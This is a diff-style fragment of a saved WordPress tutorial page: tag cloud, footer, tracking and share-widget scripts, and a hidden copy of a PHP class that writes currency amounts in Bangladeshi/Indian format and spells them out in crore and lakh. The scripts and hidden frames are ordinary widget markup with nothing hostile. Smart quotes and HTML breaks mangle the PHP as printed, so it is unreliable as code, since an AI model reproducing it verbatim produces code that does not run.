+<a href="http://www.tanzilo.com/tag/post/" class="tag-link-10" title="2 topics" style="font-size: 11.4054054054pt;">POST</a>
+<a href="http://www.tanzilo.com/tag/print/" class="tag-link-8" title="2 topics" style="font-size: 11.4054054054pt;">print</a>
+<a href="http://www.tanzilo.com/tag/protect/" class="tag-link-44" title="2 topics" style="font-size: 11.4054054054pt;">protect</a>
+<a href="http://www.tanzilo.com/tag/script/" class="tag-link-4" title="2 topics" style="font-size: 11.4054054054pt;">script</a>
+<a href="http://www.tanzilo.com/tag/session/" class="tag-link-22" title="1 topic" style="font-size: 8pt;">session</a>
+<a href="http://www.tanzilo.com/tag/show/" class="tag-link-281" title="2 topics" style="font-size: 11.4054054054pt;">show</a>
+<a href="http://www.tanzilo.com/tag/solution/" class="tag-link-133" title="3 topics" style="font-size: 13.6756756757pt;">solution</a>
+<a href="http://www.tanzilo.com/tag/source-code/" class="tag-link-6" title="1 topic" style="font-size: 8pt;">source code</a>
+<a href="http://www.tanzilo.com/tag/store/" class="tag-link-39" title="1 topic" style="font-size: 8pt;">Store</a>
+<a href="http://www.tanzilo.com/tag/sub-directory/" class="tag-link-45" title="1 topic" style="font-size: 8pt;">sub-directory</a>
+<a href="http://www.tanzilo.com/tag/tableless/" class="tag-link-25" title="1 topic" style="font-size: 8pt;">Tableless</a>
+<a href="http://www.tanzilo.com/tag/tableless-footer/" class="tag-link-30" title="1 topic" style="font-size: 8pt;">Tableless Footer</a>
+<a href="http://www.tanzilo.com/tag/tableless-header/" class="tag-link-29" title="1 topic" style="font-size: 8pt;">Tableless Header</a>
+<a href="http://www.tanzilo.com/tag/text/" class="tag-link-40" title="1 topic" style="font-size: 8pt;">Text</a>
+<a href="http://www.tanzilo.com/tag/tutorial/" class="tag-link-7" title="1 topic" style="font-size: 8pt;">tutorial</a>
+<a href="http://www.tanzilo.com/tag/two-columns/" class="tag-link-47" title="1 topic" style="font-size: 8pt;">two columns</a>
+<a href="http://www.tanzilo.com/tag/unicode/" class="tag-link-37" title="2 topics" style="font-size: 11.4054054054pt;">Unicode</a>
+<a href="http://www.tanzilo.com/tag/variable/" class="tag-link-11" title="2 topics" style="font-size: 11.4054054054pt;">variable</a>
+<a href="http://www.tanzilo.com/tag/variables/" class="tag-link-23" title="1 topic" style="font-size: 8pt;">variables</a>
+<a href="http://www.tanzilo.com/tag/web-design/" class="tag-link-24" title="1 topic" style="font-size: 8pt;">Web Design</a>
+<a href="http://www.tanzilo.com/tag/website-design/" class="tag-link-26" title="1 topic" style="font-size: 8pt;">Website Design</a>
+<a href="http://www.tanzilo.com/tag/wordpress/" class="tag-link-42" title="10 topics" style="font-size: 22pt;">Wordpress</a></div>
+</section></aside>
+</div>
+	</div>
+	<!-- End Content -->
+	<footer id="page-footer">
+	<div id="site5bottom">Created by <a href="http://www.s5themes.com/">Site5 WordPress Themes</a>.<br>Experts in <a href="http://gk.site5.com/t/546">WordPress Hosting</a>. </div>
+	© Copyright 2011 Diary/Notebook Theme by Site5.com. All Rights Reserved. 	</footer>
+</div>
+
+<script type="text/javascript" src="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/form.js"></script>
+<script type="text/javascript" src="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/jquery_002.js"></script>
+<script type="text/javascript">
+/* <![CDATA[ */
+var _wpcf7 = {"loaderUrl":"http:\/\/www.tanzilo.com\/wp-content\/plugins\/contact-form-7\/images\/ajax-loader.gif","sending":"Sending ..."};
+/* ]]> */
+</script>
+<script type="text/javascript" src="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/scripts.js"></script>
+<!--stats_footer_test--><script src="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/e-201510.js" type="text/javascript"></script>
+<script type="text/javascript">
+st_go({blog:'3329260',v:'ext',post:'112'});
+var load_cmc = function(){linktracker_init(3329260,112,2);};
+if ( typeof addLoadEvent != 'undefined' ) addLoadEvent(load_cmc);
+else load_cmc();
+</script><img id="wpstats" src="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/g.gif">
+
+		<div style="top: 6111.5px; left: 661.5px;" class="pp_pic_holder light_rounded">       <div class="pp_top">        <div class="pp_left"></div>        <div class="pp_middle"></div>        <div class="pp_right"></div>       </div>       <div class="pp_content_container">        <div class="pp_left">        <div class="pp_right">         <div class="pp_content">          <div class="pp_loaderIcon"></div>          <div class="pp_fade">           <a href="#" class="pp_expand" title="Expand the image">Expand</a>           <div class="pp_hoverContainer">            <a class="pp_next" href="#">next</a>            <a class="pp_previous" href="#">previous</a>           </div>           <div id="pp_full_res"></div>           <div class="pp_details clearfix">            <a class="pp_close" href="#">Close</a>            <p class="pp_description"></p>            <div class="pp_nav">             <a href="#" class="pp_arrow_previous">Previous</a>             <p class="currentTextHolder">0/0</p>             <a href="#" class="pp_arrow_next">Next</a>            </div>           </div>          </div>         </div>        </div>        </div>       </div>       <div class="pp_bottom">        <div class="pp_left"></div>        <div class="pp_middle"></div>        <div class="pp_right"></div>       </div>      </div>      <div style="opacity: 0; height: 9966px;" class="pp_overlay"></div>      <div style="top: 6111.5px; left: 681.5px;" class="ppt"></div><div style="display:none;" id="__fghjktghndfgt_once"></div><div style="position: absolute; top: -1999px; left: -1988px;" id="stcpDiv"><p>{code type=PHP}</p>
+<p><!--?php</p-->
+</p><p>	error_reporting(E_ALL);<br>
+	//error_reporting(0);</p>
+<p>	class Currency<br>
+	{</p>
+<p>		function __construct()<br>
+		{<br>
+			//do nothing for now<br>
+		}</p>
+<p>		// http://www.phpbuilder.com/board/showthread.php?t=10350901<br>
+		function get_bd_money_format($amount)<br>
+		{<br>
+			$output_string = '';<br>
+			$fraction = '';<br>
+			$tokens = explode('.', $amount);<br>
+			$number = $tokens[0];<br>
+			if(count($tokens) &gt; 1)<br>
+			{<br>
+				$fraction = (double)(‘0.’ . $tokens[1]);<br>
+				$fraction = $fraction * 100;<br>
+				$fraction = round($fraction, 0);<br>
+				$fraction = ‘.’ . $fraction;<br>
+			}</p>
+<p>			$number = $number . ”;<br>
+			$spl=str_split($number);<br>
+			$lpcount=count($spl);<br>
+			$rem=$lpcount-3;<br>
+			//echo “rem”.$rem.”<br>“;<br>
+			//even one<br>
+			if($lpcount%2==0)<br>
+			{<br>
+				for($i=0;$i&lt;=$lpcount-1;$i++)<br>
+				{</p>
+<p>					if($i%2!=0 &amp;&amp; $i!=0 &amp;&amp; $i!=$lpcount-1)<br>
+					{<br>
+						$output_string .= ",";<br>
+					}<br>
+					$output_string .= $spl[$i];<br>
+				}<br>
+			}<br>
+			//odd one<br>
+			if($lpcount%2!=0)<br>
+			{<br>
+				for($i=0;$i&lt;=$lpcount-1;$i++)<br>
+				{<br>
+					if($i%2==0 &amp;&amp; $i!=0 &amp;&amp; $i!=$lpcount-1)<br>
+					{<br>
+						$output_string .= ",";<br>
+					}<br>
+					$output_string .= $spl[$i];<br>
+				}<br>
+			}<br>
+			return $output_string . $fraction;<br>
+		}</p>
+<p>		// http://efreedom.com/Question/1-3181945/Convert-Money-Text-PHP<br>
+		function translate_to_words($number)<br>
+		{<br>
+		/*****<br>
+			 * A recursive function to turn digits into words<br>
+			 * Numbers must be integers from -999,999,999,999 to 999,999,999,999 inclussive.<br>
+			 *<br>
+			 *  (C) 2010 Peter Ajtai<br>
+			 *    This program is free software: you can redistribute it and/or modify<br>
+			 *    it under the terms of the GNU General Public License as published by<br>
+			 *    the Free Software Foundation, either version 3 of the License, or<br>
+			 *    (at your option) any later version.<br>
+			 *<br>
+			 *    This program is distributed in the hope that it will be useful,<br>
+			 *    but WITHOUT ANY WARRANTY; without even the implied warranty of<br>
+			 *    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the<br>
+			 *    GNU General Public License for more details.<br>
+			 *<br>
+			 *    See the GNU General Public License: <http: www.gnu.org="" licenses="">.<br>
+			 *<br>
+			 */<br>
+			// zero is a special case, it cause problems even with typecasting if we don’t deal with it here<br>
+			$max_size = pow(10,18);<br>
+			if (!$number) return “zero”;<br>
+			if (is_int($number) &amp;&amp; $number &lt; abs($max_size))<br>
+			{<br>
+				$prefix = '';<br>
+				$suffix = '';<br>
+				switch ($number)<br>
+				{<br>
+					// set up some rules for converting digits to words<br>
+					case $number &lt; 0:<br>
+						$prefix = "negative";<br>
+						$suffix = $this-&gt;translate_to_words(-1*$number);<br>
+						$string = $prefix . ” ” . $suffix;<br>
+						break;<br>
+					case 1:<br>
+						$string = “one”;<br>
+						break;<br>
+					case 2:<br>
+						$string = “two”;<br>
+						break;<br>
+					case 3:<br>
+						$string = “three”;<br>
+						break;<br>
+					case 4:<br>
+						$string = “four”;<br>
+						break;<br>
+					case 5:<br>
+						$string = “five”;<br>
+						break;<br>
+					case 6:<br>
+						$string = “six”;<br>
+						break;<br>
+					case 7:<br>
+						$string = “seven”;<br>
+						break;<br>
+					case 8:<br>
+						$string = “eight”;<br>
+						break;<br>
+					case 9:<br>
+						$string = “nine”;<br>
+						break;<br>
+					case 10:<br>
+						$string = “ten”;<br>
+						break;<br>
+					case 11:<br>
+						$string = “eleven”;<br>
+						break;<br>
+					case 12:<br>
+						$string = “twelve”;<br>
+						break;<br>
+					case 13:<br>
+						$string = “thirteen”;<br>
+						break;<br>
+					// fourteen handled later<br>
+					case 15:<br>
+						$string = “fifteen”;<br>
+						break;<br>
+					case $number &lt; 20:<br>
+						$string = $this-&gt;translate_to_words($number%10);<br>
+						// eighteen only has one “t”<br>
+						if ($number == 18)<br>
+						{<br>
+						$suffix = “een”;<br>
+						} else<br>
+						{<br>
+						$suffix = “teen”;<br>
+						}<br>
+						$string .= $suffix;<br>
+						break;<br>
+					case 20:<br>
+						$string = “twenty”;<br>
+						break;<br>
+					case 30:<br>
+						$string = “thirty”;<br>
+						break;<br>
+					case 40:<br>
+						$string = “forty”;<br>
+						break;<br>
+					case 50:<br>
+						$string = “fifty”;<br>
+						break;<br>
+					case 60:<br>
+						$string = “sixty”;<br>
+						break;<br>
+					case 70:<br>
+						$string = “seventy”;<br>
+						break;<br>
+					case 80:<br>
+						$string = “eighty”;<br>
+						break;<br>
+					case 90:<br>
+						$string = “ninety”;<br>
+						break;<br>
+					case $number &lt; 100:<br>
+						$prefix = $this-&gt;translate_to_words($number-$number%10);<br>
+						$suffix = $this-&gt;translate_to_words($number%10);<br>
+						//$string = $prefix . “-” . $suffix;<br>
+						$string = $prefix . ” ” . $suffix;<br>
+						break;<br>
+					// handles all number 100 to 999<br>
+					case $number &lt; pow(10,3):<br>
+						// floor return a float not an integer<br>
+						$prefix = $this-&gt;translate_to_words(intval(floor($number/pow(10,2)))) . ” hundred”;<br>
+						if ($number%pow(10,2)) $suffix = ” and ” . $this-&gt;translate_to_words($number%pow(10,2));<br>
+						$string = $prefix . $suffix;<br>
+						break;<br>
+					case $number &lt; pow(10,6):<br>
+						// floor return a float not an integer<br>
+						$prefix = $this-&gt;translate_to_words(intval(floor($number/pow(10,3)))) . ” thousand”;<br>
+						if ($number%pow(10,3)) $suffix = $this-&gt;translate_to_words($number%pow(10,3));<br>
+						$string = $prefix . ” ” . $suffix;<br>
+						break;<br>
+				}<br>
+			} else<br>
+			{<br>
+				echo “ERROR with – $number<br> Number must be an integer between -” .
+ number_format($max_size, 0, “.”, “,”) . ” and ” . 
+number_format($max_size, 0, “.”, “,”) . ” exclussive.”;<br>
+			}<br>
+			return $string;<br>
+		}</http:></p>
+<p>		function get_bd_amount_in_text($amount)<br>
+		{<br>
+			$output_string = ”;</p>
+<p>			$tokens = explode(‘.’, $amount);<br>
+			$current_amount = $tokens[0];<br>
+			$fraction = ”;<br>
+			if(count($tokens) &gt; 1)<br>
+			{<br>
+				$fraction = (double)(‘0.’ . $tokens[1]);<br>
+				$fraction = $fraction * 100;<br>
+				$fraction = round($fraction, 0);<br>
+				$fraction = (int)$fraction;<br>
+				$fraction = $this-&gt;translate_to_words($fraction) . ‘ paisa';<br>
+				$fraction = ‘ Taka &amp; ‘ . $fraction;<br>
+			}</p>
+<p>			$crore = 0;<br>
+			if($current_amount &gt;= pow(10,7))<br>
+			{<br>
+				$crore = (int)floor($current_amount / pow(10,7));<br>
+				$output_string .= $this-&gt;translate_to_words($crore) . ‘ crore ‘;<br>
+				$current_amount = $current_amount – $crore * pow(10,7);<br>
+			}</p>
+<p>			$lakh = 0;<br>
+			if($current_amount &gt;= pow(10,5))<br>
+			{<br>
+				$lakh = (int)floor($current_amount / pow(10,5));<br>
+				$output_string .= $this-&gt;translate_to_words($lakh) . ‘ lakh ‘;<br>
+				$current_amount = $current_amount – $lakh * pow(10,5);<br>
+			}</p>
+<p>			$current_amount = (int)$current_amount;<br>
+			$output_string .= $this-&gt;translate_to_words($current_amount);</p>
+<p>			$output_string = $output_string . $fraction . ‘ only';<br>
+			$output_string = ucwords($output_string);<br>
+			return $output_string;<br>
+		}</p>
+<p>	}</p>
+<p>	$currency_object = new Currency();</p>
+<p>	for($i=1; $i&lt;10; $i++)<br>
+	{<br>
+		$seed = time() / ($i + 1);<br>
+		srand($seed);<br>
+		$amount = mt_rand(100, 9999999);<br>
+		$amount = $amount + $i/10;<br>
+		echo $currency_object-&gt;get_bd_money_format($amount) . ‘ : ‘ . $currency_object-&gt;get_bd_amount_in_text($amount) . ‘<br>‘;</p>
+<p>	}</p>
+<p>?&gt;</p> - See more at: 
+http://www.tanzilo.com/2011/01/28/php-convert-number-currency-to-text-in-asian-i-e-bangladeshi-indian-format/#sthash.hl6CHpUk.dpuf</div><iframe style="display:none;" scrolling="no" src="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/getSegment.htm" name="stSegmentFrame" id="stSegmentFrame" frameborder="0" height="0px" width="0px"></iframe><div style="display: none;" class="stwrapper stwrapper5x" id="stwrapper"><iframe src="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/index.htm" scrolling="no" name="stLframe" class="stLframe" id="stLframe" allowtransparency="true" frameborder="0"></iframe></div><div onclick="javascript:stWidget.closeWidget();" id="stOverlay"></div></body></html>
